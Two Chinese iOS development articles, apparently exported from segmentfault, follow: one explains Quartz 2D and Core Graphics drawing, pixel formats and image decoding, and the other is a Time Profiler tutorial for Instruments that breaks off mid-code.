<p>让我们简单了解一下Quartz 2D的概念。更多细节可以参考 Apple 的 <a rel=""nofollow"" href=""https://developer.apple.com/library/mac/#documentation/GraphicsImaging/Conceptual/drawingwithquartz2d/Introduction/Introduction.html"">官方文档</a>。</p>

<p>Quartz 2D是一个处理2D绘制的非常强大的工具。有基于路径的绘制，反锯齿渲染，透明图层，分辨率，并且设备独立等很多特性。因为是更为底层的基于C的API，所以看上去会有一点让人恐惧。</p>

<p>主要概念是非常简单的。UIKit和AppKit都封装了Quartz 2D的一些简单API，一旦你熟练了，一些简单C的API也是很容易理解的。最后你可以做一个引擎，它的功能和Photoshop一样。Apple提到的一个 <a rel=""nofollow"" href=""https://developer.apple.com/videos/wwdc/2011/?id=129"">APP</a>，就是一个很好的Quartz 2D例子。</p>

<p>当你的程序进行位图绘制时，不管使用哪种方式，都是基于Quartz 2D的。也就是说，CPU通过Quartz 2D绘制。尽管Quartz可以做其他事情，但是我们这里还是集中于位图绘制，比如在缓存(一块内存)绘制位图会包括RGBA数据。</p>

<p>比方说，我们要画一个八角形，我们通过UIKit能做到这一点</p>

<pre><code>UIBezierPath *path = [UIBezierPath bezierPath];
[path moveToPoint:CGPointMake(16.72, 7.22)];
[path addLineToPoint:CGPointMake(3.29, 20.83)];
[path addLineToPoint:CGPointMake(0.4, 18.05)];
[path addLineToPoint:CGPointMake(18.8, -0.47)];
[path addLineToPoint:CGPointMake(37.21, 18.05)];
[path addLineToPoint:CGPointMake(34.31, 20.83)];
[path addLineToPoint:CGPointMake(20.88, 7.22)];
[path addLineToPoint:CGPointMake(20.88, 42.18)];
[path addLineToPoint:CGPointMake(16.72, 42.18)];
[path addLineToPoint:CGPointMake(16.72, 7.22)];
[path closePath];
path.lineWidth = 1;
[[UIColor redColor] setStroke];
[path stroke];
</code></pre>

<p>Core Graphics 的代码差不多：</p>

<pre><code>CGContextBeginPath(ctx);
CGContextMoveToPoint(ctx, 16.72, 7.22);
CGContextAddLineToPoint(ctx, 3.29, 20.83);
CGContextAddLineToPoint(ctx, 0.4, 18.05);
CGContextAddLineToPoint(ctx, 18.8, -0.47);
CGContextAddLineToPoint(ctx, 37.21, 18.05);
CGContextAddLineToPoint(ctx, 34.31, 20.83);
CGContextAddLineToPoint(ctx, 20.88, 7.22);
CGContextAddLineToPoint(ctx, 20.88, 42.18);
CGContextAddLineToPoint(ctx, 16.72, 42.18);
CGContextAddLineToPoint(ctx, 16.72, 7.22);
CGContextClosePath(ctx);
CGContextSetLineWidth(ctx, 1);
CGContextSetStrokeColorWithColor(ctx, [UIColor redColor].CGColor);
CGContextStrokePath(ctx);
</code></pre>

<p>问题就是，绘制到哪里呢？ 这就是CGContext做的事情。我们传递的ctx这个参数。这个context定义了我们绘制的地方。如果我们实现了CALayer的-drawInContext:方法。我们传递了一个参数context。在context上面绘制，最后会在layer的一个缓存里面。我们也可以创建我们自己的context，比如 CGBitmapContextCreate（）。这个函数返回一个context，然后我们可以传递这个context，然后在刚刚创建的这个context上面绘制。</p>

<p>这里我们发现，UIKit的代码并没有传递context。这是因为UIKit或AppKit的context是隐形的。UIKit和UIKit维护着一个context栈。这些UIKit的方法始终在最上面的context绘制。你可以使用UIGraphicsPushContext（）和 UIGraphicsPopContext（）来push和pop对应的context。</p>

<p>UIKit有一个简单的方式，通过 UIGraphicsBeginImageContextWithOptions（） 和 UIGraphicsEndImageContext()来创建一个位图context，和 CGBitmapContextCreate（）一样。混合UIKit和 Core Graphics调用很简单。</p>

<pre><code>UIGraphicsBeginImageContextWithOptions(CGSizeMake(45, 45), YES, 2);
CGContextRef ctx = UIGraphicsGetCurrentContext();
CGContextBeginPath(ctx);
CGContextMoveToPoint(ctx, 16.72, 7.22);
CGContextAddLineToPoint(ctx, 3.29, 20.83);
...
CGContextStrokePath(ctx);
UIGraphicsEndImageContext();
</code></pre>

<p>或其他方式</p>

<pre><code>CGContextRef ctx = CGBitmapContextCreate(NULL, 90, 90, 8, 90 * 4, space, bitmapInfo);
CGContextScaleCTM(ctx, 0.5, 0.5);
UIGraphicsPushContext(ctx);
UIBezierPath *path = [UIBezierPath bezierPath];
[path moveToPoint:CGPointMake(16.72, 7.22)];
[path addLineToPoint:CGPointMake(3.29, 20.83)];
...
[path stroke];
UIGraphicsPopContext(ctx);
CGContextRelease(ctx);
</code></pre>

<p>通过 Core Graphics可以做很多有趣的事情。苹果的文档有很多例子，我们这里就不太细说他们了。但是Core Graphics有一个非常接近Adobe Illustrator和Adobe Photoshop如何工作的绘图模型，并且大多数工具的理念翻译成Core Graphics了。毕竟这就是NextStep一开始做的。</p>

<h3>CGLayer</h3>

<p>一件非常值得提起的事，便是CGLayer。它经常被忽视，并且它的名字有时会造成困惑。他不是Photoshop中的图层的意思，也不是Core Animation中的层的意思。</p>

<p>把CGLayer想象成一个子context。它共用父context的所有特性。你可以独立于父context，在它自己的缓存中绘制。并且因为它跟context紧密的联系在一起，CGLayer可以被高效的绘制到context中。</p>

<p>什么时候这将变得有用呢?如果你用Core Graphics来绘制一些相当复杂的，并且部分内容需要被重新绘制的，你只需将那部分内容绘制到CGLayer一次，然后便可绘制这个CGLayer到父context中。这是一个非常优雅的性能窍门。这和我们前面提到的离屏绘制概念有点类似。你需要做出权衡，是否需要为CGLayer的缓存申请额外的内存，确定这是否对你有所帮助。</p>

<h3>像素（Pixels）</h3>

<p>屏幕上面的像素是通过3个颜色组成的：红，绿，蓝。因此位图数据有时候也被成为RGB数据。你可能想知道这个数据在内存中是什么样子。但是实际上，有非常非常多的方式。</p>

<p>后面我们会提到压缩，这个和下面讲得完全不一样。现在我们看一下RGB位图数据。RGB位图数据的每一个值有3个组成部分，红，绿，蓝。更多的时候，我们有4个组成部分，红，绿，蓝，alpha。这里我们讲4个组成部分的情况。</p>

<h3>默认的像素布局</h3>

<p>iOS和OS X上面的最通常的文件格式是32 bits-per-pixel (bpp),8 bits-per-component (bpc)，alpha会被预先计算进去。在内存里面像这个样子</p>

<pre><code>  A   R   G   B   A   R   G   B   A   R   G   B  
| pixel 0       | pixel 1       | pixel 2   
  0   1   2   3   4   5   6   7   8   9   10  11 ...
</code></pre>

<p>这个格式经常被叫做ARGB。每一个像素使用4个字节，每一个颜色组件1个字节。每一个像素有一个alpha值在R，G，B前面。最后RGB分别预先乘以alpha。如果我们有一个橘黄的颜色。那么看上去就是 240，99，24. ARGB就是 255，240，99，24 如果我们有一个同样的颜色，但是alpha是0.33，那么最后的就是 ARGB就是 84，80，33，8</p>

<p>另一个常见的格式是32bpp，8bpc，alpha被跳过了：</p>

<pre><code>  x   R   G   B   x   R   G   B   x   R   G   B  
| pixel 0       | pixel 1       | pixel 2   
  0   1   2   3   4   5   6   7   8   9   10  11 ...
</code></pre>

<p>这个也被称为xRGB。像素并没有alpha（也就是100%不透明），但是内存结构是相同的。你可能奇怪为什么这个格式很流行。因为如果我们把这个没用的字节从像素中去掉，我们可以节省25%的空间。实际上，这个格式更适合现代的CPU和图像算法。因为每一个独立的像素和32字节对齐。现代CPU不喜欢读取不对其的数据。算法会处理大量的位移，特别是这个格式和ARGB混合在一起的时候。</p>

<p>当处理xRGB时，Core Graphic也需要支持把alpha放到最后的格式，比如RGBA，RGBx（RGB已经预先乘以alpha的格式）</p>

<h3>深奥的布局</h3>

<p>大多数时候，当我们处理位图数据时，我们就在使用Core Graphic 或是 Quartz 2D。有一个列表包括了所有的支持的文件格式。让我们先看一下剩余的RGB格式。</p>

<p>有16bpp，5bpc，不包括alpha。这个格式比之前节省50%空间（2个字节一个像素）。但是如果解压成RGB数据在内存里面或是磁盘上面就有用了。但是，因为只有5个字节一个像素，图像特别是一些平滑的渐变，可能就混合到一起了。（图像质量下降）。</p>

<p>还有一个是64bpp，16bpc，最终为128bpp，32bpc，浮点数组件(有或没有alpha值)。它们分别使用8字节和16字节，并且允许更高的精度。当然，这会造成更多的内存和更复杂的计算。</p>

<p>最后，Core Graphics 也支持一些其他格式，比如CMYK，还有一些只有alpha的格式，比如之前提到的遮罩。</p>

<h3>平面数据 （Planar Data color plane）</h3>

<p>大多数的框架（包括 Core Graphics）使用的像素格式是混合起来的。这就是所谓的 planar components, or component planes。每一个颜色组件都在内存中的一个区域。比如，对于RGB数据。我们有3个独立的内存空间，分别保存红色，绿色，和蓝色的数值。</p>

<p>在某些情况下，一些视频框架会使用 Planar Data。</p>

<h3>YCbCr</h3>

<p>YCbCr 是一个常见的视频格式。同样有3个部分组成（Y，Cb，Cr）。但是它更倾向于人眼识别的颜色。人眼是很难精确识别出来Cb和Cr的色彩度。但是却能很容易识别出来Y的亮度。在相同的质量下，Cb和Cr要比Y压缩的更多。</p>

<p>JPEG有时候把RGB格式转换为YCbCr格式。JPEG单独压缩每一个color plane。当压缩YCbCr格式时，Cb和Cr比Y压缩得更好。</p>

<h3>图片格式</h3>

<p>iOS和OSX上面的大多数图片都是JPEG和PNG格式。下面我们再了解一下。</p>

<h3>JPEG</h3>

<p>每个人都知道JPEG，他来自相机。他代表了图片是图和存储在电脑里，即时是你的妈妈也听过JPEG。</p>

<p>大家都认为JPEG就是一个像素格式。就像我们之前提到的RGB格式一样，但是实际上并不是这样。</p>

<p>真正的JPEG数据变成像素是一个非常复杂的过程。一个星期都没有办法讲清楚，或是更久。对于一个color plane， JPEG使用一种离散余弦变换的算法。讲空间信息转换为频率（convert spatial information into the frequency domain）。然后通过哈夫曼编码的变种来压缩。一开始会把RGB转换成YCbCr，解压缩的时候，再反过来。</p>

<p>这就是为什么从一个JPEG文件创建一个UIImage然后会知道屏幕上面会有一点点延迟的原因。因为CPU正在忙于解压图片。如果每个TableViewCell都需要解压图片的话，那么你的滚动效果就不会平滑。</p>

<p>那么，为什么使用JPEG文件呢？因为JPEG可以把图片压缩的非常非常好。一个没有压缩过的IPhone5拍照的图片差不多24MB。使用默认的压缩设置，这个只有2-3MB。JPEG压缩效果非常好，因为几乎没有损失。他把那些人眼不能识别的部分去掉了。这样做可以远远的超过gzip这样的压缩算法。但是，这个仅仅在图片上面有效。因为，JPEG依赖于丢掉那些人眼无法识别的数据。如果你从一个基本是文本的网页截取一张图片，JPEG就不会那么高效，压缩效率会变得低下。你甚至都可以看出图片已经变形了。</p>

<h3>PNG</h3>

<p>PNG读作“ping”，和JPEG相反，他是无损压缩的。当你保存图片成PNG时，然后再打开。所有的像素数据和之前的完全一样。因为有这个限制，所有PNG压缩图片的效果没有JPEG那么好。但是对于app中的设计来说，比如按钮，icon，PNG就非常适合。而且PNG的解码工作要比JPEG简单很多。</p>

<p>在真实的世界里面，事情没有这么简单。有很多不同的PNG格式。维基百科上面有很多细节。但是简单说，PNG支持压缩有alpha或是没有alpha通道的RGB像素，这也就是为什么他适合app上面的原因。</p>

<h3>格式挑选</h3>

<p>当在app中使用颜色是，你需要使用者2种格式中得一个，PNG和JPEG。他们的解码和压缩算法都是被高度硬件优化的。有些情况甚至支持并行计算。同时Apple也在不断地提高解码的能力在未来的操作系统版本中。如果使用其他格式，这可能会对你的程序性能产生影响，而且可能会产生漏洞，因为图像解码的算法是黑客们最喜欢攻击的目标。</p>

<p>已经讲了好多有关<a rel=""nofollow"" href=""https://duckduckgo.com/?q=%22optimizing%20PNG%22"">PNG</a>的优化了，你可以在互联网上面自己查找。这里需要注意一点，Xcode的压缩算法和大部分的压缩引擎不一样。</p>

<p>当Xcode压缩png时，技术上来说，已经不是一个有效的PNG文件了。但是iOS系统可以读取这个文件，然后比通常的PNG图片处理速度更快。Xcode这样做，是为了更好地利用解码算法，而这些解码算法不能在一般的PNG文件上面适用。就像上面提到的，有非常多的方法去表示RGB数据。而且如果这个格式不是iOS图形图像系统需要的，那么就需要增加额外的计算。这样就不会有性能上的提高了。</p>

<p>再抢到一次，如果你可以，你需要设置 resizable images。你的文件会变得更小，因此，这样就会有更小的文件需要从文件系统里面读取，然后在解码。</p>

<h3>UIKit and Pixels</h3>

<p>UIKit中得每一个view都有自己的CALayer，一般都有一个缓存，也就是位图，有一点类似图片。这个缓存最后会被绘制到屏幕上面。</p>

<h3>With -drawRect:</h3>

<p>如果你的自定义view的类实现了-drawRest：，那么就是这样子工作的：</p>

<p>当你调用-setNeedsDisplay时，UIKit会调用这个view的层的 -setNeedsDisplay方法。这个设置一个标记，表明这个层已经脏了（dirty，被修改了）。实际上，并没有做任何事情，所以，调用多次-setNeedsDisplay 没有任何问题。</p>

<p>当渲染系统准备好后，会调用层的-display方法。这时，层会设置缓存。然后设置缓存的Core Graphics的上下文环境（CGContextRef）。后面的绘制会通过这个CGContextRef绘制到缓存中。</p>

<p>当你调用UIKit中的函数，比如UIRectFill() 或者 -[UIBezierPath fill]时，会通过这个CGContextRef调用你的drawRect方法。他们是通过把上面的CGContextRef push 到 图形图像堆栈中，也就是设置成当前的上下文环境。UIGraphicsGetCurrent（）会返回刚才push的那个context。由于UIKit绘制方法使用UIGraphicsGetCurrent（），所以这些绘制会被绘制到缓存中。如果你希望直接使用 Core Graphics 方法，那么你需要调用UIGraphicsGetCurrent（）方法，然后自己手动传递context参数到Core Graphics的绘制函数中去。</p>

<p>那么，一个个层的缓存都会被绘制到屏幕上面，知道下一次设置-setNeedsDisplay，然后再重新更新缓存，再重复上面的过程。</p>

<h3>不使用 drawRect</h3>

<p>当你使用UIImageView的时候，有一点点的不同。这个view依然包含一个CALayer，但是这个层并不会分配一个缓存空间。而是使用CGImageRef作为CALayer的contents属性，渲染系统会把这个图片绘制到帧的缓存，比如屏幕。</p>

<p>这个情况下，就没有继续绘制的过程了。我们就是简单的通过传递位图这种方式把图片传递给UIImageView，然后传递给Core Animation，然后传递给渲染系统。</p>

<h3>使用drawRect 还是不使用drawRect</h3>

<p>听上去不怎么样，但是，最快速的方法，就是不使用。</p>

<p>大多数情况，你可以通过自定义view或是组合其他层来实现。可以看一下Chris的文章，有关<a rel=""nofollow"" href=""http://www.objc.io/issue-3/custom-controls.html"">自定义控件</a>。这个方法是推荐的，因为UIKit非常高效。</p>

<p>当你需要自定义绘制的时候 <a rel=""nofollow"" href=""https://developer.apple.com/videos/wwdc/2012/?id=506"">WWDC2012 session 506 Optimizing 2D Graphics and Animation Performance</a>是一个非常好的例子 。</p>

<p>另一个地方需要自定义绘制的是iOS的股票软件。这个股票图是通过Core Graphics实现的。注意，这个只是你需要自定义绘制，并不是一定要实现drawRect函数，有时候通过UIGraphicsBeginImageContextWithOptions（）或是 CGBitmapContextCreate（）创建一个额外的位图，然后再上面绘制图片，然后传递给CALayer的contents会更容易。下面有一个测试<a rel=""nofollow"" href=""http://www.objc.io/issue-3/moving-pixels-onto-the-screen.html#concurrent-drawing"">例子</a></p>

<h3>单色</h3>

<p>这是一个简单的例子</p>

<pre><code>// Don't do this
- (void)drawRect:(CGRect)rect
{
    [[UIColor redColor] setFill];
    UIRectFill([self bounds]);
}
</code></pre>

<p>我们知道为什么这样做很烂，我们让Core Animation创建了一个额外的缓存，然后我们让Core Graphics 在缓存上面填充了一个颜色。然后上传给了GPU。</p>

<p>我们可以不实现-drawRect:函数来省去这些步骤。只是简单的设置view的backgroundColor就好了。如果这个view有CAGradientLayer，那么同样的方法也可以设置成渐变的颜色。</p>

<h3>可变大小的图片（resizable image）</h3>

<p>你可以简单的通过可变大小的图片减少图形系统的工作压力。如果你原图上面的按钮大小是300*50。那么就有 600 * 100 = 60k 像素 * 4 = 240KB的内存数据需要传递给GPU。传递给显存。如果我们使用resizable image。我们可以使用一个 52 * 12 大小的图片，这样可以节省10kb的内存。这样会更快。</p>

<p>Core Animation 通过 contentsCenter 来resize图片，但是，更简单的是通过 -[UIImage resizableImageWithCapInsets:resizingMode:]。</p>

<p>而且，在第一次绘制的时候，我们并不需要从文件系统读取60K像素的PNG文件，然后解码。越小的图片解码越快。这样，我们的app就可以启动的更快。</p>

<h3>并发绘制</h3>

<p>上一个我们讲到了并发。UIKit的线程模型非常简单，你只能在主线程使用UIKit。所以，这里面还能有并发的概念？</p>

<p>如果你不得不实现-drawRect:，并且你必须绘制大量的东西，而这个会花费不少时间。而且你希望动画变得更平滑，除了在主线程中，你还希望在其他线程中做一些工作。并发的绘图是复杂的，但是除了几个警告，并发的绘图还是比较容易实现的。</p>

<p>你不能在CAlayer的缓存里面做任何事情出了主线程，否则不好的事情会发生。但是你可以在一个独立的位图上面绘制。</p>

<p>所有的Core Graphics的绘制方法需要一个context参数，指定这个绘制到那里去。UIKit有一个概念是绘制到当前的context上。而这个当前的context是线程独立的。</p>

<p>为了实现异步绘制，我们做下面的事情。我们在其他队列（queue，GCD中的概念）中创建一个图片，然后我们切换到主队列中把结果传递给UIImageView。这个技术被 <a rel=""nofollow"" href=""https://developer.apple.com/videos/wwdc/2012/?id=211"">WWDC 2012 session 211</a>中提到</p>

<pre><code>- (UIImage *)renderInImageOfSize:(CGSize)size;
{
    UIGraphicsBeginImageContextWithOptions(size, NO, 0);

    // do drawing here

    UIImage *result = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return result;
}
</code></pre>

<p>这个函数通过UIGraphicsBeginImageContextWithOptions 创建一个新的CGContextRef。这个函数也修改了当前的UIKit的context。然后可以铜鼓UIKit的方法绘制，然后通过UIGraphicsGetImageFromCurrentImageContext（）根据位图数据生成一个UIImage。然后关闭掉创建的这个context。</p>

<p>保证线程安全是非常重要的，比如你访问UIKit的属性，必须线程安全。如果你在其他队列调用这个方法，而这个方法在你的view类里面，这个事情就可能古怪了。更简单的方法是创建一个独立的渲染类，然后当触发绘制这个图片的时候才设置这些必须得属性。</p>

<p>但是UIKit的绘制函数是可以在其他队列中调用的，只需要保证这些操作在 UIGraphicsBeginImageContextWithOptions（） 和 UIGraphicsEndImageContext （）之前就好。</p>

<p>你可以通过下面的方法触发绘制</p>

<pre><code>UIImageView *view; // assume we have this
NSOperationQueue *renderQueue; // assume we have this
CGSize size = view.bounds.size;
[renderQueue addOperationWithBlock:^(){
    UIImage *image = [renderer renderInImageOfSize:size];
    [[NSOperationQueue mainQueue] addOperationWithBlock:^(){
        view.image = image;
    }];
}];
</code></pre>

<p>注意view.image = image; 必须在主队列调用。这是非常重要的细节。你不能在其他队列中调用。</p>

<p>通常来说，异步绘制会带来很多复杂度。你需要实现取消绘制的过程。你还需要限制异步操作的最大数目。</p>

<p>所以，最简单的就是通过NSOperation的子类来实现renderInImageOfSize方法。</p>

<p>最后，有一点非常重要的就是异步设置UITableViewCell 的content有时候很诡异。因为当异步绘制结束的时候，这个Cell很可能已经被重用到其他地方了。</p>

<h3>CALayer的奇怪和最后</h3>

<p>现在你是到了CALayer某种程度上很像GPU中的纹理。层有自己的缓存，缓存就是一个会被绘制到屏幕上的位图。 大多数情况，当你使用CALayer时，你会设置contents属性给一个图片。这个意思就是告诉 Core Animation，使用这个图片的位图数据作为纹理。 如果这个图片是PNG或JPEG，Core Animation 会解码，然后上传到GPU。</p>

<p>当然，还有其他种类的层，如果你使用CALayer，不设置contents，而是这事background color， Core Animation不会上传任何数据给GPU，当然这些工作还是要被GPU运算的，只是不需要具体的像素数据，同理，渐变也是一个道理，不需要把像素上传给GPU。</p>

<h3>图层和自定义绘制</h3>

<p>如果CALayer或是子类实现了 -drawInContext 或是-drawLayer:inContext delegate。Core Animation会为这个layer创建一个缓存，用来保存这些函数中绘制的结果。这些代码是在CPU上面运行的，结果会被传递给GPU。</p>

<h3>形状和文本层（Shape and Text Layers）</h3>

<p>形状和文本层会有一点不同。首先，Core Animation 会为每一个层生成一个位图文件用来保存这些数据。然后Core Animation 会绘制到layer的缓存上面。如果你实现了-drawInContext方法，结果和上面提到的一样。最后性能会受到很大影响。</p>

<p>当你修改形状层或是文本层导致需要更新layer的缓存时，Core Animation会重新渲染缓存，比如。当实现shape layer的大小动画时，Core Animation会在动画的每一帧中重新绘制形状。</p>

<h3>异步绘制</h3>

<p>CALayer 有一个属性是 drawsAsynchronously。这个似乎看上去很不错，可以解决所有问题。实际上虽然可能会提高效率，但是可能会让事情更慢。</p>

<p>当你设置 drawsAsynchronously = YES 后，-drawRect: 和 -drawInContext: 函数依然实在主线程调用的。但是所有的Core Graphics函数（包括UIKit的绘制API，最后其实还是Core Graphics的调用）不会做任何事情，而是所有的绘制命令会被在后台线程处理。</p>

<p>这种方式就是先记录绘制命令，然后在后台线程执行。为了实现这个过程，更多的事情不得不做，更多的内存开销。最后只是把一些工作从主线程移动出来。这个过程是需要权衡，测试的。</p>

<p>这个可能是代价最昂贵的的提高绘制性能的方法，也不会节省很多资源。</p>

<hr>
<p>原文：<a rel=""nofollow"" href=""http://www.objc.io/issue-3/moving-pixels-onto-the-screen.html#pixels"">Getting Pixels onto the Screen</a><br>
转载自：<a rel=""nofollow"" href=""http://blog.jobbole.com/54511/"">伯乐在线</a> - <a rel=""nofollow"" href=""http://blog.jobbole.com/author/studentdeng/"">studentdeng</a></p>

                ", iOS 开发：绘制像素到屏幕,1531972188,399,1,720,1,1,https://segmentfault.com/a/1190000000390012
195,1,0,6,"
                    
<p><em>编者注：或许很多人对 Instruments 应用不太了解，但可能很多老的 iOS 开发者都应该用过 Instruments 工具来检测iOS应用内存泄漏情况。特别是在iOS 5.0之前，即苹果在iOS平台上面还没支持ARC的时候，写iOS应用就类似C语言那样，容易忘记释放内存，而内存对移动设备而言是非常可贵的。</em></p>

<h3>入门</h3>

<p>为了节省大家的时间,提供一个演示的Demo给大家.<a rel=""nofollow"" href=""http://cdn4.raywenderlich.com/downloads/InstrumentsTutorial.zip"">代码传送门</a>.<br>
下载后解压然后用xcode打开.<br>
编译运行APP后 然后在搜索框内输入任意词汇,点击结果你会看到下面的结果<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQI"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>正如你所见的,这个app很简单.程序其实调用的是Flickr的API,通过app顶部的搜索框执行搜索后在下面的tableview显示你搜索的搜索词,搜索词后面的括号内有搜索结果的个数,点击此行进入一个略缩图的结果列表页面 如上图. 点击其中一行 进入图像的大图模式,在这个页面你可以根据需要旋转图像.<br>
到目前为止页面看起来差不多了,你也许会想应该可以直接提交appstore了吧.接下来这篇文章将会教你instruments工具来提高你app性能和稳定性.</p>

<h3>“时间探测器”</h3>

<p>天下武功，唯快不破。很多公司都信奉这个教条.恨不得把app压法周期压缩到最低,这就导致了开发中隐藏了很多问题,有点经验的工程师草率的优化下,更糟的情况那些没有经验的工程师甚至不会对app进行任何优化.</p>

<p>某种程度上来说,你开发过程中是可以忽略性能优化的. 十年前,移动设备的硬件资源是非常有限的.甚至连浮点数都是被禁止的.因为浮点数能导致代码变大计算的速度变慢.</p>

<p>科技发展如此迅速的今天,硬件很大程度上可以弥补软件的短板.现在的移动设备3D硬件处理的效率甚至媲美于PC机了,但是你不能总依赖于硬件和处理器速度来掩饰你APP做的多垃圾吧.(如果安卓系统跑在Iphone上还能够像IOS一样顺滑吗?,其实是一个道理的)</p>

<p>性能这个概念很抽线,所以我们必须借助数据化图形化的输出方式.你可能花一周的时间去优化一个有趣的算法,但是这算法只占总执行时间的0.5%,不管你花多少精力去优化它,没人会注意到.相反一个for循环花费了90%的时间,你稍微修改下就能提高10%的效率,就是这个简单的修改可以得到大家很大的好感.因为.他们运行app时的第一感受就是比之前快了很多.没人会care你修改的是一个多牛逼的算法,还是一个简单的for循环.</p>

<p>这个说明了什么? 与其花费时间在优化小细节上不如多点时间找到你改优化的地方.</p>

<p>下面引出第一个工具 “时间事件查看器”(自己杜撰的名字英文—Time Profiler),———他可以测量时间的间隔,中断程序执行,跟踪每个线程的堆栈.你可以想象下是xcode调试时按下暂停时的画面<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQJ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>比如,100个样本都在做1毫秒的间隔,然后在某个方法堆栈顶部有10个样本,你可以推算出大概的时间有10%个10毫秒花费在此方法中,这是一个近似值.</p>

<p>废话少说,时间是个检测到的.</p>

<p>从xcode的菜单选择Product-Profile,或者选择⌘I,<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQK"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>程序会启动Instruments,这时候你会看到一个选择窗口<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQL"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>这是instruments所有测试仪器的面板,选择 “timer profilter” 点击“profile”回启东模拟器和app,此时会要求你输入一次密码,以便instruments能有权限去截获监听此进程.<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>在工具窗口中，可以看到时间计数，并留下了一个小箭头移动到右侧的图形在屏幕的中央上方。这表明该应用程序正在运行。</p>

<p>现在开始运行app,搜索一些图片,这时候你发现查找一个结果太慢了,而且搜索结果列表页面滚动起来也是让人无法忍受的,<br>
首先，确保工具栏中的视图选择有选择的所有三个选项，如下所示：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>￼这将确保所有的面板都打开。现在，研究下面的截图和它下面的每个部分的解释：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQO"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<ol>
<li><p>录控按钮。中间的红色按钮将停止与启动它被点击时，应用程序目前正在分析。注意这实际上是停止和启动应用程序,而不是暂停它。</p></li>
<li><p>运行定时器和运行导航,定时器显示APP已经运行了多长时间,箭头之间是可以移动的。如果停止，然后使用录制按钮重新启动应用程序，这将开始一个新的运行。显示屏便会显示“run2 of 2”，你可以回到第一次运行的数据，首先你停止当前运行，然后按下左箭头回去。</p></li>
<li><p>运行轨道.</p></li>
<li><p>扩展面板,在时间探查仪器的情况下，它是用来跟踪显示堆栈</p></li>
<li><p>详细地面板。它显示了你正在使用的仪器的主要信息,这是使用频率最高的部门,可以从它这里看到cpu运行的时间</p></li>
<li><p>选项面板 稍后介绍</p></li>
</ol>
<p>重头戏来了.</p>

<h3>深究</h3>

<p>执行图像搜索，并深究结果。我个人比较喜欢寻找“狗”，当然你也可以选择任意你想要的内容.比如猫啊美女啊什么的.</p>

<p>现在上下滚动记下列表,让时间探测器测量下数据,然后注意看下屏幕的变化和数值.这些数值反应了CPU周期.</p>

<p>但是你也许会发现下面的数值太多,看你的眼花缭乱. 下面打开左边的调用树 然后按着如下的配置<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQP"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>以下介绍下配置选项：</p>

<ul>
<li>Separate by Thread: 每个线程应该分开考虑。只有这样你才能揪出那些大量占用CPU的""重""线程  </li>
<li>Invert Call Tree: 从上倒下跟踪堆栈,这意味着你看到的表中的方法,将已从第0帧开始取样,这通常你是想要的,只有这样你才能看到CPU中话费时间最深的方法.也就是说FuncA{FunB{FunC}} 勾选此项后堆栈以C-&gt;B-A 把调用层级最深的C显示在最外面 </li>
<li>Hide Missing Symbols: 如果dSYM无法找到你的app或者系统框架的话,那么表中看不到方法名只能看到十六进制的数值,如果勾线此项可以隐藏这些符号,便于简化数据</li>
<li>Hide System Libraries: 勾选此项你会显示你app的代码,这是非常有用的. 因为通常你只关心cpu花在自己代码上的时间不是系统上的</li>
<li>Show Obj-C Only: 只显示oc代码 ,如果你的程序是像OpenGl这样的程序,不要勾选侧向因为他有可能是C++的  </li>
<li>Flatten Recursion: 递归函数, 每个堆栈跟踪一个条目</li>
<li>Top Functions: 一个函数花费的时间直接在该函数中的总和，以及在函数调用该函数所花费的时间的总时间。因此，如果函数A调用B，那么A的时间报告在A花费的时间加上B.花费的时间,这非常真有用，因为它可以让你每次下到调用堆栈时挑最大的时间数字，归零在你最耗时的方法。</li>
</ul>
<p>如果您已启用上述选项,虽然有些值可能会略有不同，下面的结果的顺序应该是类似下表：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQQ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
通过上面你能看到大部分时间都花在更新表格照片了.</p>

<p>双击此行,然后将会看到如下<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQR"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>那么这很有趣，不是吗！几乎四分之三的时间花费在setPhoto：方法都花在创造照片的图像数据！<br>
现在可以看到的是什么问题,NSData’s dataWithContentsOfURL 方法并不会立即返回,因为要从网上去数据,每次调用都需要长达几秒的时间返回,而此方法运行在主线程,可想而知会有什么结果了.<br>
其实为了解决这个问题,类提供了一个ImageCache 的后台异步下载的方法.</p>

<p>现在，您可以切换到Xcode和手动找到该文件，但仪器有一个方便的“打开Xcode中”按钮，就在你的眼前。找到它的面板只是上面的代码并单击它：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQX"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>想如下修改</p>

<pre><code>- (void)setPhoto:(FlickrPhoto *)photo {
    _photo = photo;

    self.textLabel.text = photo.title;f

//    NSData *imageData = [NSData dataWithContentsOfURL:_photo.thumbnailUrl]; 
//    self.imageView.image = [UIImage imageWithData:imageData];

    [[ImageCache sharedInstance] downloadImageAtURL:_photo.thumbnailUrl
